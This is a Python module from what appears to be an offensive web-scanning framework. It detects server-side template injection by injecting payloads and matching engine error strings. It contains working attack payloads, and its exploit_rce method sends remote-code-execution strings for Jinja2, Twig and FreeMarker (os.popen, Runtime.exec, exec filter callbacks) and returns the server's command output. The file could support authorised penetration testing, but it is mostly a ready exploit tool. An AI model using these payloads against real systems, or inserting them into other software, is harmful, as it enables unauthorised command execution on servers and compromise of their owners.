#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - SSTI Module
Server-Side Template Injection detection and exploitation
"""

import re
from config import Payloads, Colors


class SSTIModule:
    """SSTI Testing Module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "SSTI"
        
        # Template engine indicators
        self.template_engines = {
            'jinja2': [
                'jinja2',
                'jinja2.exceptions',
                'undefinederror',
            ],
            'django': [
                'django.template',
                'template syntax error',
                'django',
            ],
            'twig': [
                'twig',
                'twig_error',
            ],
            'smarty': [
                'smarty',
                'smarty error',
            ],
            'freemarker': [
                'freemarker',
                'freemarker.template',
            ],
            'velocity': [
                'velocity',
                'org.apache.velocity',
            ],
            'thymeleaf': [
                'thymeleaf',
                'thymeleaferrors',
            ],
            'handlebars': [
                'handlebars',
                'handlebars error',
            ],
            'razor': [
                'razor',
                'aspnet',
            ],
        }
    
    def test(self, url: str, method: str, param: str, value: str):
        """Test for SSTI"""
        # Test basic SSTI
        self._test_basic(url, method, param, value)
        
        # Test for specific engines
        self._test_engines(url, method, param, value)
    
    def test_url(self, url: str):
        """Test URL for SSTI"""
        pass
    
    def _test_basic(self, url: str, method: str, param: str, value: str):
        """Test for basic SSTI"""
        payloads = Payloads.SSTI_PAYLOADS
        
        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                response_text = response.text
                
                # Check for mathematical evaluation (7*7=49)
                if '49' in response_text and '{{7*7}}' in payload:
                    from core.engine import Finding
                    finding = Finding(
                        technique="SSTI (Expression Evaluation)",
                        url=url,
                        severity='CRITICAL',
                        confidence=0.95,
                        param=param,
                        payload=payload,
                        evidence="Template expression evaluated: 7*7=49",
                    )
                    self.engine.add_finding(finding)
                    return
                
                # Check for template engine errors
                for engine, indicators in self.template_engines.items():
                    for indicator in indicators:
                        if indicator.lower() in response_text.lower():
                            from core.engine import Finding
                            finding = Finding(
                                technique=f"SSTI ({engine.upper()})",
                                url=url,
                                severity='CRITICAL',
                                confidence=0.9,
                                param=param,
                                payload=payload,
                                evidence=f"Template engine error: {engine}",
                            )
                            self.engine.add_finding(finding)
                            return
                            
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'SSTI test error: {e}')}")
    
    def _test_engines(self, url: str, method: str, param: str, value: str):
        """Test for specific template engines"""
        engine_tests = {
            'jinja2': [
                '{{7*7}}',
                '{{config}}',
                '{{self}}',
                "{{''.__class__.__mro__[2].__subclasses__()}}",
            ],
            'django': [
                '{%% raw %%}{{7*7}}{%% endraw %%}',
                '{{request}}',
            ],
            'twig': [
                '{{7*7}}',
                '{{_self.env.registerUndefinedFilterCallback("exec")}}',
            ],
            'freemarker': [
                '${7*7}',
                '${T(java.lang.Runtime).getRuntime().exec("id")}',
            ],
            'velocity': [
                '#set($x=7*7)$x',
            ],
        }
        
        for engine, payloads in engine_tests.items():
            for payload in payloads:
                try:
                    data = {param: payload}
                    response = self.requester.request(url, method, data=data)
                    
                    if not response:
                        continue
                    
                    # Check for engine-specific responses
                    if engine == 'jinja2' and '49' in response.text:
                        from core.engine import Finding
                        finding = Finding(
                            technique="SSTI (Jinja2)",
                            url=url,
                            severity='CRITICAL',
                            confidence=0.9,
                            param=param,
                            payload=payload,
                            evidence="Jinja2 template engine detected",
                        )
                        self.engine.add_finding(finding)
                        return
                        
                except Exception as e:
                    if self.engine.config.get('verbose'):
                        print(f"{Colors.error(f'SSTI engine test error: {e}')}")
    
    def exploit_rce(self, url: str, param: str, engine: str = 'jinja2') -> str:
        """Generate RCE payload for SSTI"""
        if engine == 'jinja2':
            payloads = [
                "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__['__import__']('os').popen('id').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            ]
        elif engine == 'twig':
            payloads = [
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            ]
        elif engine == 'freemarker':
            payloads = [
                '${T(java.lang.Runtime).getRuntime().exec("id")}',
            ]
        else:
            payloads = []
        
        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, 'POST', data=data)
                
                if response:
                    return response.text
            except Exception as e:
                print(f"{Colors.error(f'SSTI RCE error: {e}')}")
        
        return None
